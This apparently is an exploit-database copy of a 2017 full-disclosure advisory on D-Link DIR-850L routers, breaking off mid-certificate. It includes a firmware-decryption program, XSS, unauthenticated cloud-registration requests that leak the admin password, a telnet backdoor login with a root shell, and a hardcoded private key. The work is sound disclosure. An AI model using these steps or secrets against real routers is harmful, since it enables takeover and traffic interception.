@@ -1,0 +1,1306 @@
+id: 28464
+date: 09/09/2017
+title: D-Link 850L XSS / Backdoor / Code Execution Vulnerabilities
+author: Pierre Kim
+cves: 
+
+## Advisory Information
+
+Title: Pwning the Dlink 850L routers and abusing the MyDlink Cloud protocol
+Advisory URL: https://pierrekim.github.io/advisories/2017-dlink-0x00-dlink-850l-cloud.txt
+Blog URL: https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+Date published: 2017-09-08
+Vendors contacted: None
+Release mode: Full-Disclosure
+CVE: -
+
+
+
+## Product Description
+
+Dlink is a multinational networking equipment manufacturing corporation.
+
+The Dlink 850L is a Wireless AC1200 Dual Band Gigabit "Cloud" Router.
+
+Mydlink Cloud Services allow you to access, view and control the
+devices on your home network from anywhere.
+
+
+
+## Vulnerabilities Summary
+
+The Dlink 850L is a router overall badly designed with a lot of vulnerabilities.
+
+Basically, everything was pwned, from the LAN to the WAN. Even the
+custom MyDlink cloud protocol was abused.
+
+My research in analyzing the security of Dlink 850L routers starts
+from a recent security contest organized by a security company.
+The Dlink 850L has 2 versions of these routers with very slight
+hardware modifications.
+The contest targeted the first version (revisionA) but I
+(unfortunately) received the wrong version, revisionB (thank you
+Amazon!), which was not eligible for the contest.
+In this advisory, I would like to introduce the 0day vulnerabilities
+from both versions of Dlink 850L that were not submitted to the
+contest.
+Note that I submitted a valid vulnerability to SSD which was patched
+[https://blogs.securiteam.com/index.php/archives/3364].
+
+
+Following a very badly coordinated previous disclosure with Dlink last February
+(see https://pierrekim.github.io/blog/2017-02-02-update-dlink-dwr-932b-lte-routers-vulnerabilities.html),
+full-disclosure is applied this time.
+
+
+The summary of the vulnerabilities is:
+
+1. Firmware "protection"
+2. WAN && LAN - revA - XSS
+3. WAN && LAN - revB - Retrieving admin password, gaining full access
+using the custom mydlink Cloud protocol
+4. WAN        - revA and revB - Weak Cloud protocol
+5. LAN        - revB - Backdoor access
+6. WAN && LAN - revA and revB - Stunnel private keys
+7. WAN && LAN - revA - Nonce bruteforcing for DNS configuration
+8. Local      - revA and revB - Weak files permission and credentials
+stored in cleartext
+9. WAN        - revB - Pre-Auth RCEs as root (L2)
+10. LAN       - revA and revB - DoS against some daemons
+
+
+revA targets the revision A of the router with the latest firmware
+available (`DIR850L_REVA_FW114WWb07_h2ab_beta1.bin`).
+revB targets the revision B of the router with the latest firmware
+images available (`DIR850LB1_FW207WWb05.bin` and
+`DIR850L_REVB_FW207WWb05_h1ke_beta1.bin` from
+http://support.dlink.com/ProductInfo.aspx?m=DIR-850L, `DIR850LB1
+FW208WWb02.bin` [from
+http://support.dlink.com.au/Download/download.aspx?product=DIR-850L]).
+
+
+
+## Details - Firmware "protection"
+
+The latest firmware for Dlink 850L revA
+(`DIR850L_REVA_FW114WWb07_h2ab_beta1.bin`) is not protected and a new
+firmware image can be trivially forged by an attacker.
+
+The latest firmware images for Dlink 850L revB
+(`DIR850LB1_FW207WWb05.bin`, `DIR850L_REVB_FW207WWb05_h1ke_beta1.bin`
+and `DIR850LB1 FW208WWb02.bin`) are password-protected with a
+hardcoded password.
+
+Here is a program to decrypt the firmware image:
+
+
+    /*
+     * Simple tool to decrypt D-LINK DIR-850L REVB firmwares
+     *
+     * $ gcc -o revbdec revbdec.c
+     * $ ./revbdec DIR850L_REVB_FW207WWb05_h1ke_beta1.bin
+wrgac25_dlink.2013gui_dir850l >
+DIR850L_REVB_FW207WWb05_h1ke_beta1.decrypted
+     */
+
+    #include <sys/types.h>
+    #include <sys/stat.h>
+    #include <fcntl.h>
+    #include <unistd.h>
+    #include <stdio.h>
+    #include <string.h>
+    #include <stdlib.h>
+
+    #define USAGE "Usage: decimg <filename> <key>\n"
+
+    int main(int    argc,
+             char   **argv)
+    {
+            int     i, fi;
+            int     fo = STDOUT_FILENO, fe = STDERR_FILENO;
+
+            if (argc != 3)
+            {
+                    write(fe, USAGE, strlen(USAGE));
+                    return (EXIT_FAILURE);
+            }
+
+            if ((fi = open(argv[1], O_RDONLY)) == -1)
+            {
+                    perror("open");
+                    write(fe, USAGE, strlen(USAGE));
+                    return (EXIT_FAILURE);
+            }
+
+            const char *key = argv[2];
+            int kl = strlen(key);
+
+            i = 0;
+            while (1)
+            {
+                    char buffer[4096];
+                    int j, len;
+                    len = read(fi, buffer, 4096);
+                    if (len <= 0)
+                            break;
+                    for (j = 0; j < len; j++) {
+                            buffer[j] ^= (i + j) % 0xFB + 1;
+                            buffer[j] ^= key[(i + j) % kl];
+                    }
+                    write(fo, buffer, len);
+                    i += len;
+            }
+
+           return (EXIT_SUCCESS);
+    }
+
+
+You can use this program to decrypt firmware images:
+
+    user@kali:~/petage-dlink$ ./revbdec
+DIR850L_REVB_FW207WWb05_h1ke_beta1.bin wrgac25_dlink.2013gui_dir850l >
+DIR850L_REVB_FW207WWb05_h1ke_beta1.decrypted
+    user@kali:~/petage-dlink$ binwalk
+DIR850L_REVB_FW207WWb05_h1ke_beta1.decrypted
+
+    DECIMAL       HEXADECIMAL     DESCRIPTION
+    --------------------------------------------------------------------------------
+    0             0x0             DLOB firmware header, boot
+partition: "dev=/dev/mtdblock/1"
+    593           0x251           LZMA compressed data, properties:
+0x88, dictionary size: 1048576 bytes, uncompressed size: 65535 bytes
+    10380         0x288C          LZMA compressed data, properties:
+0x5D, dictionary size: 8388608 bytes, uncompressed size: 5184868 bytes
+    1704052       0x1A0074        PackImg section delimiter tag,
+little endian size: 10518016 bytes; big endian size: 8298496 bytes
+    1704084       0x1A0094        Squashfs filesystem, little endian,
+version 4.0, compression:lzma, size: 8296266 bytes, 2678 inodes,
+blocksize: 131072 bytes, created: 2017-01-20 06:39:29
+
+
+The protection of the firmware images is non-existent.
+
+
+
+## Details - WAN && LAN - revA - XSS
+
+Simply by analyzing PHP files inside `/htdocs/web`, we can discover
+several trivial XSS.
+
+An attacker can use the XSS to target an authenticated user in order
+to steal the authentication cookies.
+
+
+/htdocs/web/wpsacts.php:
+
+    user@kali:~/petage-dlink$ wget -qO- --post-data='action=<a>'
+http://ip:port/wpsacts.php
+    <?xml version="1.0" encoding="utf-8"?>
+    <wpsreport>
+            <action><a></action>
+            <result></result>
+            <reason></reason>
+    </wpsreport>
+
+
+    user@kali:~/petage-dlink$ cat ./fs/htdocs/web/wpsacts.php
+    [..]
+    <wpsreport>
+            <action><?echo $_POST["action"];?></action>
+    [...]
+
+
+XSS inside /htdocs/web/shareport.php:
+
+    [...]
+             <action><?echo $_POST["action"];?></action>
+    [...]
+
+XSS inside /htdocs/web/sitesurvey.php:
+
+    [...]
+            <action><?echo $_POST["action"];?></action>
+    [...]
+
+XSS inside /htdocs/web/wandetect.php:
+
+    [...]
+       <action><?echo $_POST["action"];?></action>
+    [...]
+
+XSS inside /htdocs/web/wpsacts.php:
+
+    [...]
+       <action><?echo $_POST["action"];?></action>
+    [...]
+
+
+
+## Details - WAN && LAN - revB - Retrieving admin password, gaining
+full access using the custom mydlink Cloud protocol
+
+DISCLAIMER: Beware, no request has been sent directly to any servers
+operated by Dlink or other companies. All internet network traffic
+shown below is legitimate and produced by Dlink itself, or by products
+of Dlink (Dlink Cloud, Dlink browser extensions, Dlink 850L). All the
+findings exposed below were discovered without exceeding Dlink terms
+of use. This simply demonstrates how much broken this service is at
+the time of writing (run away!).
+
+The webpage http://ip_of_router/register_send.php doesn't check the
+authentication of the user, thus an attacker can abuse this webpage to
+gain control of the device.
+This webpage is used to register the device to the myDlink cloud infrastructure.
+
+Attack scenario:
+
+o The attacker will use the unauthenticated /register_send.php webpage to:
+  1. create a MyDlink Cloud account,
+  2. signin the device to this account,
+  3. add the device to this account (the device will pass admin
+password to the Cloud platform! Meaning the passwords are stored in
+cleartext).
+
+o The attacker will then visit Dlink mycloud webpage) using a classic
+browser (i.e.: Firefox 50) and install the official Dlink NPAPI
+extension (this will not work with Firefox > 50 or any recent version
+of Chrome since this plugin requires unsandboxed NPAPI support). This
+webpage will allow the attacker to remotely control the device
+(reboot, general management...).
+
+
+o Then, using `Firefox dev tools`, the attacker can passively analyze
+the default HTTP requests/responses from the Dlink APIs on
+www.mydlink.com:
+The dlink cloud interface will leak by default the password of the
+device (!) inside the answer of a `PUT` request (and inside `GET`
+requests too). Just
+by watching the HTTP requests from the NPAPI plugin, the APIs will
+provide passwords of the device in cleartext.
+
+o Finally, the NPAPI plugins will automatically establish a tunnel
+between the router and the Firefox browser:
+the attacker will be able to visit
+`http://127.0.0.1:dynamicaly_generated_remote_port/` to reach the
+remote router.
+The traffic will go directly to Amazon servers then to the remote Dlink router:
+
+  Firefox NPAPI client (http://127.0.0.1:remote_port/)   ->    Amazon
+ ->    Dlink 850L HTTP Interface.
+
+
+o The attacker will use the previous password provided by the legit
+HTTPS answers from the Dlink APIs and will be able to login inside the
+router.
+At that point complete control over the router is achieved.
+
+o This is made possible by the `signalc` program (inside /mydlink/)
+that creates a TCP tunnel to Amazon servers.
+
+Finally, I will demonstrate some part of the traffic inside this
+tunnel is in cleartext and the other part (encrypted traffic) can be
+MITM'd
+thanks to self-signed certificates and the complete lack of
+certificate verification.
+
+
+
+Let's resume the attack:
+
+The PHP script hosted at http://ip_of_router/register_send.php will
+serve as a proxy between the attacker and the remote Dlink APIs.
+This page will also retrieve the password (it is stored in cleartext -
+see part 8. Weak files permission and credentials stored in cleartext)
+and send it to remote Dlink APIs.
+
+
+    151 $devpasswd = query("/device/account/entry/password"); <-
+$devpasswd contains the password of the device
+    152 $action = $_POST["act"];
+
+
+The password will be sent during the association of the device (3rd
+request : "adddev") to the Mydlink Cloud service (see the
+`&device_password=$devpasswd`):
+
+    178 //sign up
+    179 $post_str_signup = "client=wizard&wizard_version="
+.$wizard_version. "&lang=" .$_POST["lang"].
+    180                    "&action=sign-up&accept=accept&email="
+.$_POST["outemail"]. "&password=" .$_POST["passwd"].
+    181                    "&password_verify=" .$_POST["passwd"].
+"&name_first=" .$_POST["firstname"]. "&name_last="
+.$_POST["lastname"]." ";
+    182
+    183 $post_url_signup = "/signin/";
+    184
+    185 $action_signup = "signup";
+    186
+    187 //sign in
+    188 $post_str_signin = "client=wizard&wizard_version="
+.$wizard_version. "&lang=" .$_POST["lang"].
+    189             "&email=" .$_POST["outemail"]. "&password="
+.$_POST["passwd"]." ";
+    190
+    191 $post_url_signin = "/account/?signin";
+    192
+    193 $action_signin = "signin";
+    194
+    195 //add dev (bind device)
+    196 $post_str_adddev = "client=wizard&wizard_version="
+.$wizard_version. "&lang=" .$_POST["lang"].
+    197             "&dlife_no=" .$mydlink_num. "&device_password="
+.$devpasswd. "&dfp=" .$dlinkfootprint." ";
+    198
+    199 $post_url_adddev = "/account/?add";
+    200
+    201 $action_adddev = "adddev";
+    202
+    203 //main start
+    204 if($action == $action_signup)                    <---- first request
+    205 {
+    206         $post_str = $post_str_signup;
+    207         $post_url = $post_url_signup;
+    208         $withcookie = "";   //signup dont need cookie info
+    209 }
+    210 else if($action == $action_signin)               <---- second request
+    211 {
+    212         $post_str = $post_str_signin;
+    213         $post_url = $post_url_signin;
+    214         $withcookie = "\r\nCookie: lang=en;
+mydlink=pr2c11jl60i21v9t5go2fvcve2;";
+    215 }
+    216 else if($action == $action_adddev)               <---- 3rd request
+    217 {
+    218         $post_str = $post_str_adddev;
+    219         $post_url = $post_url_adddev;
+    220 }
+
+
+
+To exploit this vuln, let's create 3 HTTP requests to the dlink router:
+
+The first one ("signup") will create an user on the MyDlink service:
+
+    user@kali:~/petage-dlink$ wget -qO- --user-agent="" --post-data
+'act=signup&lang=en&outemail=MYEMAIL@GMAIL.COM&passwd=SUPER_PASSWORD&firstname=xxxxxxxx&lastname=xxxxxxxx'
+http://ip/register_send.php
+
+    <?xml version="1.0"?>
+    <register_send>
+       <result>success</result>
+       <url>http://mp-us-portal.auto.mydlink.com</url>
+    </register_send>
+
+Internally, this request was crafted and sent to MyDlink Cloud APIs:
+
+    179 $post_str_signup = "client=wizard&wizard_version="
+.$wizard_version. "&lang=" .$_POST["lang"].
+    180                    "&action=sign-up&accept=accept&email="
+.$_POST["outemail"]. "&password=" .$_POST["passwd"].
+    181                    "&password_verify=" .$_POST["passwd"].
+"&name_first=" .$_POST["firstname"]. "&name_last="
+.$_POST["lastname"]." ";
+
+
+The second one ("signin") will "signin" the newly created user - the
+router will be associated with this account - but not activated:
+
+    user@kali:~/petage-dlink$ wget -qO- --user-agent="" --post-data
+'act=signin&lang=en&outemail=MYEMAIL@GMAIL.COM&passwd=SUPER_PASSWORD&firstname=xxxxxxxx&lastname=xxxxxxxx'
+http://ip/register_send.php
+
+    <?xml version="1.0"?>
+    <register_send>
+      <result>success</result>
+      <url>http://mp-us-portal.auto.mydlink.com</url>
+    </register_send>
+
+Internally, this request was crafted and sent to MyDlink Cloud APIs:
+
+    188 $post_str_signin = "client=wizard&wizard_version="
+.$wizard_version. "&lang=" .$_POST["lang"].
+    189             "&email=" .$_POST["outemail"]. "&password="
+.$_POST["passwd"]." ";
+
+
+The last one will associate the device to the dlink service and will
+send the password of the device to the remote APIs of Dlink:
+
+    user@kali:~/petage-dlink$ wget -qO- --user-agent="" --post-data
+'act=adddev&lang=en' http://ip/register_send.php
+
+    <?xml version="1.0"?>
+    <register_send>
+      <result>success</result>
+      <url>http://mp-us-portal.auto.mydlink.com</url>
+    </register_send>
+
+Internally, this request was crafted and sent to MyDlink Cloud APIs:
+
+    196 $post_str_adddev = "client=wizard&wizard_version="
+.$wizard_version. "&lang=" .$_POST["lang"].
+    197             "&dlife_no=" .$mydlink_num. "&device_password="
+.$devpasswd. "&dfp=" .$dlinkfootprint." ";
+
+
+Now please confirm the email using the email sent from Dlink:
+
+[please use the HTML version at
+https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+to see the image]
+
+
+Then, visit http://mydlink.com/ and login using the email and the password.
+
+You will see the device listed in the web interface (You need to
+install the plugin - you can use "IE8 - Win7.ova" from Microsoft, you
+need Firefox 50 to use the plugin).
+
+
+Please see the attached screenshot to see the available management options:
+
+[please use the HTML version at
+https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+to see the image]
+
+[please use the HTML version at
+https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+to see the image]
+
+[please use the HTML version at
+https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+to see the image]
+
+[please use the HTML version at
+https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+to see the image]
+
+By analyzing the requests, we can get more information about the
+targeted router (note the requests are made by default when browsing
+the www.mydlink.com website!):
+
+[please use the HTML version at
+https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+to see the image]
+
+It appears the `PUT` (`PUT IDENTIFIER_OF_THE_ROUTER`) request provides
+a response with the cleartext password of the device!
+
+[please use the HTML version at
+https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+to see the image]
+
+
+Note that there is a `GET` request on the end of the image, we will
+study it too.
+
+    https://eu.mydlink.com/device/devices/DEVICEID?_=SOME_RANDOM_DATA&access_token=ACCESS_TOKEN
+
+The `POST` data are:
+
+    {"id":"EDITED_DEVICE_ID","order":0,"mac":"EDITED_MAC_ADDRESS","model":"DIR-850L","ddnsServer":"eu.mydlink.com","activatedDate":"EDITED_ACTIVATION_DATE","hwVer":"B1","selected":true,"defaultIconUrl":"https://d3n8c69ydsbj5n.cloudfront.net/Product/Pictures/DIR-850L/DIR-850L_default.gif","type":"router","series":"","name":"","authKey":"","status":"","adminPassword":"","plainPassword":"","fwUpgrade":false,"fwVer":"","provVer":"","binded":true,"registered":null,"supportHttps":null,"signalAddr":"","features":[],"serviceCnvr":{"enabled":false,"plan":"","space":0,"expireTime":0,"contentValidThru":0},"serviceLnvr":{"targetStorageId":null,"targetStorageVolumeId":null},"added2UniPlugin":false,"connections":[{"id":"http","scheme":"http","tunnel":null,"ip":null,"port":null},{"id":"httpWithCredential","scheme":"http","tunnel":null,"ip":null,"port":null},{"id":"https","scheme":"https","tunnel":null,"ip":null,"port":null},{"id":"httpsWithCredential","scheme":"https","tunnel":null,"ip":null,"port":null},{"id":"liveview","scheme":"","tunnel":null,"ip":null,"port":null},{"id":"playback","scheme":"","tunnel":null,"ip":null,"port":null},{"id":"config","scheme":"","tunnel":null,"ip":null,"port":null}]}
+
+
+The answer is, in cleartext (and contains the password of the device):
+
+    {"name":"DIR-850L","status":"online","authKey":"EDITED","adminPassword":"password","plainPassword":"password","fwUpgrade":false,"fwVer":"2.07","provVer":"2.0.18-b04","binded":true,"registered":true,"supportHttps":true,"signalAddr":"mp-eu-signal.auto.mydlink.com","features":[1,2,3,4,28,29],"serviceCnvr":{"enabled":false,"plan":"","space":0,"expireTime":0,"contentValidThru":0},"serviceLnvr":{"targetStorageId":null,"targetStorageVolumeId":null}}
+
+
+A `GET` request is done too (the last one on the previous image),
+which allows to retrieve the password and the previous one (was
+changed in the router to confirm this fact):
+
+[please use the HTML version at
+https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+to see the image]
+
+The request is:
+
+    GET https://eu.mydlink.com/device/devices/DEVICE_ID?_=RANDOM_NUMBER&access_token=ACCESS_TOKEN
+HTTP/1.1
+
+And the answer is the same, with the previous password (plainPassword)
+and the new password (adminPassword):
+
+    {"name":"DIR-850L","status":"online","authKey":"EDITED","adminPassword":"password","plainPassword":"PASSWORD","fwUpgrade":false,"fwVer":"2.07","provVer":"2.0.18-b04","binded":true,"registered":true,"supportHttps":true,"signalAddr":"mp-eu-signal.auto.mydlink.com","features":[1,2,3,4,28,29],"serviceCnvr":{"enabled":false,"plan":"","space":0,"expireTime":0,"contentValidThru":0},"serviceLnvr":{"targetStorageId":null,"targetStorageVolumeId":null}}
+
+
+
+Finally, a request is made from the NPAPI plug-in asking for a tunnel
+between the browser and the remote router:
+
+[please use the HTML version at
+https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+to see the image]
+
+
+The request to `/tssm/tssml.php` will ask the remote Cloud platform to
+forward the traffic to the device number 3XXXXXXX.
+This will provide the attacker information about the new-established
+TCP tunnel from the browser NPAPI extension to the DLINK 850L router,
+via the Cloud platform:
+
+    https://eu.mydlink.com/tssm/tssml.php?id=EDITED&no=EDITED_DEVICE_ID&type=1&state=3&status=1&ctype=4&browser=Mozilla/5.0+(Windows+NT+6.1;+rv:50.0)+Gecko/20100101+Firefox/50.0&message=[{"service":"http","scheme":"http","tunnel":"relay","ip":"127.0.0.1","port":50453},{"service":"https","scheme":"https","tunnel":"relay","ip":"127.0.0.1","port":50454}]&_=EDITED_RANDOM_VALUE
+
+It appears the plugin listens on `127.0.0.1:50453/tcp` (HTTP) and
+`127.0.0.1:50454/tcp` (HTTP over SSL) as shown below:
+
+[please use the HTML version at
+https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+to see the image]
+
+Ok, let's browse `http://127.0.0.1:50453/`. The traffic is sent to the
+remote router over the Cloud protocol.
+
+[please use the HTML version at
+https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+to see the image]
+
+By using the password leak found before (in the `PUT` and `GET`
+requests), the attacker can remotely pwn the router and update the
+firmware with a custom (backdoored) one:
+
+[please use the HTML version at
+https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+to see the image]
+
+MISSION COMPLETE.
+
+These vulnerabilities may affect some Dlink NAS/routers/cameras.
+
+On a side note, it is interesting to find that DLink is storing all
+the passwords of devices using the mydlink service in cleartext.
+
+
+
+## Details - WAN - revA and revB - Weak Cloud protocol
+
+The MyDlink Cloud protocol is weak. No encryption is provided by
+default by this technology, it is only a basic TCP relay system.
+All the traffic is sent over TCP to remote Amazon server without
+proper encryption:
+
+[please use the HTML version at
+https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+to see the image]
+
+There are 2 TCP relays:
+- - one with the HTTP server of the dlink router as an endpoint
+- - the other one with the HTTPS server of the dlink router as an endpoint.
+
+So, it appears, the router is reachable over this TCP tunnel using
+either HTTP and HTTPS.
+By default, you can see HTTP request AND HTTPS request from the
+browser (over the tunnel) to the router.
+About the HTTPS requests, the SSL certificate provided by the router
+is self-signed. Sus, an invalid certificate can be forged and used in
+order to successful MITM the device and intercept information. More,
+by default, a TCP relay for HTTP is made by the NPAPI plugin to the
+router as shown above.
+
+
+Futhermore, the `/mydlink/signalc` program running inside the router
+uses the MAC address of the device to get an unique identifier,
+which will always be the same, even if the dlink device is reset or
+linked with a new dlink cloud account.
+This allows Dlink to 'follow' the ownership of the device.
+
+Hopefully, an user can change the MAC addresses of the device using
+the `rgbin` binary (`/usr/sbin/devdata` is a symlink to
+`/usr/sbin/rgbin` and the used argv[0] must be `devdata` to work):
+
+    # /usr/sbin/devdata dump # will dump all the configuration
+    # /usr/sbin/devdata set -e lanmac=00:11:22:33:44:55 # will define
+a new mac address for the lan interface
+
+This program will only rewrite information over `/dev/mtdblock/4`.
+
+Finally, the mydlink interface allows the user to enter credentials
+for gmail/hotmail accounts, the credentials are then transfered to the
+routers using the tunnel established with the cloud protocol.
+It doesn't seem to be a good idea, as the traffic between the router
+and the Cloud platform is not encrypted or encrypted using a
+self-signed certificate without verification and the passwords are
+sent over this tunnel using the Internet.
+
+These vulnerabilities may affect some Dlink NAS/routers/cameras (every
+device that supports the MyDlink cloud protocol).
+
+Some wireshark (cleartext traffic and with self-signed certificate):
+
+[please use the HTML version at
+https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+to see the image]
+
+[please use the HTML version at
+https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html
+to see the image]
+
+
+
+## Details - LAN - revB - Backdoor access
+
+On revB, if you reset the device, the `/etc/init0.d/S80mfcd.sh` init
+script will start the `mfcd` binary with these arguments:
+
+    mfcd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 &
+
+`mfcd` is in fact a telnetd server. the `-u` flag defines the
+authorized user with the associated password (`$image_sign` variable).
+
+`br0` is a bridge for these interfaces: `eth0`, `peth0`, `wlan0` et
+`wlan1`. This backdoor access can be only used from the LAN side.
+
+
+    user@kali:~/petage-dlink$ cat fs/etc/init0.d/S80mfcd.sh
+    #!/bin/sh
+    echo [$0]: $1 ... > /dev/console
+    orig_devconfsize=`xmldbc -g /runtime/device/devconfsize`
+    entn=`devdata get -e ALWAYS_TN`
+    if [ "$1" = "start" ] && [ "$entn" = "1" ]; then
+            mfcd -i br0 -t 99999999999999999999999999999 &
+            exit
+    fi
+
+    if [ "$1" = "start" ] && [ "$orig_devconfsize" = "0" ]; then
+
+            if [ -f "/usr/sbin/login" ]; then
+                    image_sign=`cat /etc/config/image_sign`
+                    mfcd -l /usr/sbin/login -u
+Alphanetworks:$image_sign -i br0 &
+            else
+                    mfcd &
+            fi
+    else
+            killall mfcd
+    fi
+
+
+By using the login `Alphanetworks` and the password
+`wrgac25_dlink.2013gui_dir850l`, the attacker can get a root shell on
+the device:
+
+
+    user@kali:~/petage-dlink$ telnet 192.168.0.1
+    Trying 192.168.0.1...
+    Connected to 192.168.0.1.
+    Escape character is '^]'.
+    Login: Alphanetworks
+    Password: wrgac25_dlink.2013gui_dir850l
+
+
+    BusyBox v1.14.1 (2017-01-20 14:35:27 CST) built-in shell (msh)
+    Enter 'help' for a list of built-in commands.
+
+    # echo what
+    what
+    #
+
+
+
+## Details - WAN && LAN - revA and revB - Stunnel private keys
+
+Keys are hardcoded inside the firmware. The administration can be used
+using HTTPS. This allows an attacker to do SSL MITM:
+
+    # ls -la /etc/stunnel.key
+    -rwxr-xr-x    1 root     root         1679 Jan 20  2017 /etc/stunnel.key
+    # cat /etc/stunnel.key
+    -----BEGIN RSA PRIVATE KEY-----
+    MIIEpAIBAAKCAQEAo/0bZcpc3Npc89YiNcP+kPxhLCGLmYXR4rHLt2I1BbnkXWHk
+    MY1Umfq9FAzBYSvPYEGER4gYq467yvp5wO97CUoTSJHbJDPnp9REj6wLcMkG7R9O
+    g8/WuQ3hsoexPu4YkjJXPhtQ6YkV7seEDgP3C2TNqCnHdXzqSs7+vT17chwu8wau
+    j/VMVZ2FRHU63JQ9DG6PqcudHTW+T/KVnmWXQnspgr8ZMhXobETtdqtRPtxbA8mE
+    ZeF8+cIoA9VcqP09/VMBbRm+o5+Q4hjtvSrv+W2bEd+BDU+V45ZX8ZfPoEWYjQqI
+    kv7aMECTIX2ebgKsjCK3PfYUX5PYbVWUV+176wIDAQABAoIBAQCQR/gcBgDQO7t+
+    uc9dmLTYYYUpa9ZEW+3/U0kWbuyRvi1DUAaS5nMiCu7ivhpCYWZSnTJCMWbrQmjN
+    vLT04H9S+/6dYd76KkTOb79m3Qsvz18tr9bHuEyGgsUp66Mx6BBsSKhjt2roHjnS
+    3W29WxW3y5f6NdAM+bu12Ate+sIq8WHsdU0hZD+gACcCbqrt4P2t3Yj3qA9OzzWb
+    b9IMSE9HGWoTxEp/TqbKDl37Zo0PhRlT3/BgAMIrwASb1baQpoBSO2ZIcwvof31h
+    IfrbUWgTr7O2Im7OiiL5MzzAYBFRzxJsj15mSm3/v3cZwK3isWHpNwgN4MWWInA1
+    t39bUFl5AoGBANi5fPuVbi04ccIBh5dmVipy5IkPNhY0OrQp/Ft8VSpkQDXdWYdo
+    MKF9BEguIVAIFPQU6ndvoK99lMiWCDkxs2nuBRn5p/eyEwnl2GqrYfhPoTPWKszF
+    rzzJSBKoStoOeoRxQx/QFN35/LIxc1oLv/mFmZg4BqkSmLn6HrFq2suVAoGBAMG1
+    CqmDs2vU43PeC6G+51XahvRI3JOL0beUW8r882VPUPsgUXp9nH3UL+l9/cBQQgUC
+    n12osLOAXhWDJWvJquK9HxkZ7KiirNX5eJuyBeaxtOSfBJEKqz/yGBRRVBdBHxT2
+    a1+gO0MlG6Dtza8azl719lr8m6y2O9pyIeUewUl/AoGAfNonCVyls0FwL57n+S2I
+    eD3mMJtlwlbmdsI1UpMHETvdzeot2JcKZQ37eIWyxUNSpuahyJqzTEYhf4kHRcO/
+    I0hvAe7UeBrLYwlZquH+t6lQKee4km1ULcWbUrxHGuX6aPBDBkG+s75/eDyKwpZA
+    S0RPHuUv2RkQiRtxsS3ozB0CgYEAttDCi1G82BxHvmbl23Vsp15i19KcOrRO7U+b
+    gmxQ2mCNMTVDMLO0Kh1ESr2Z6xLT/B6Jgb9fZUnVgcAQZTYjjXKoEuygqlc9f4S/
+    C1Jst1koPEzH5ouHLAa0KxjGoFvZldMra0iyJaCz/qHw6T4HXyALrbuSwOIMgxIM
+    Y00vZskCgYAuUwhDiJWzEt5ltnmYOpCMlY9nx5qJnfcSOld5OHZ0kUsRppKnHvHb
+    MMVyCTrp1jiH/o9UiXrM5i79fJBk7NT7zqKdI0qmKTQzNZhmrjPLCM/xEwAXtQMQ
+    1ldI69bQEdRwQ1HHQtzVYgKA9XCmvrUGXRq6E5sp2ky+X1QabC7bIg==
+    -----END RSA PRIVATE KEY-----
+    # cat /etc/stunnel_cert.pem
+    Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number:
+            87:6f:88:76:87:df:e7:78
+        Signature Algorithm: sha1WithRSAEncryption
+        Issuer: C=TW, ST=Taiwan, O=None, OU=None, CN=General Root
+CA/emailAddress=webmaster@localhost
+        Validity
+            Not Before: Feb 22 06:04:36 2012 GMT
+            Not After : Feb 17 06:04:36 2032 GMT
+        Subject: C=TW, ST=Taiwan, L=HsinChu, O=None, OU=None,
+CN=General Router/emailAddress=webmaster@localhost
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                Public-Key: (2048 bit)
+                Modulus:
+                    00:a3:fd:1b:65:ca:5c:dc:da:5c:f3:d6:22:35:c3:
+                    fe:90:fc:61:2c:21:8b:99:85:d1:e2:b1:cb:b7:62:
+                    35:05:b9:e4:5d:61:e4:31:8d:54:99:fa:bd:14:0c:
+                    c1:61:2b:cf:60:41:84:47:88:18:ab:8e:bb:ca:fa:
+                    79:c0:ef:7b:09:4a:13:48:91:db:24:33:e7:a7:d4:
+                    44:8f:ac:0b:70:c9:06:ed:1f:4e:83:cf:d6:b9:0d:
+                    e1:b2:87:b1:3e:ee:18:92:32:57:3e:1b:50:e9:89:
+                    15:ee:c7:84:0e:03:f7:0b:64:cd:a8:29:c7:75:7c:
+                    ea:4a:ce:fe:bd:3d:7b:72:1c:2e:f3:06:ae:8f:f5:
+                    4c:55:9d:85:44:75:3a:dc:94:3d:0c:6e:8f:a9:cb:
+                    9d:1d:35:be:4f:f2:95:9e:65:97:42:7b:29:82:bf:
+                    19:32:15:e8:6c:44:ed:76:ab:51:3e:dc:5b:03:c9:
+                    84:65:e1:7c:f9:c2:28:03:d5:5c:a8:fd:3d:fd:53:
+                    01:6d:19:be:a3:9f:90:e2:18:ed:bd:2a:ef:f9:6d:
+                    9b:11:df:81:0d:4f:95:e3:96:57:f1:97:cf:a0:45:
+                    98:8d:0a:88:92:fe:da:30:40:93:21:7d:9e:6e:02:
+                    ac:8c:22:b7:3d:f6:14:5f:93:d8:6d:55:94:57:ed:
+                    7b:eb
+                Exponent: 65537 (0x10001)
+        X509v3 extensions:
+            X509v3 Basic Constraints:
+                CA:FALSE
+            Netscape Comment:
+                OpenSSL Generated Certificate
+            X509v3 Subject Key Identifier:
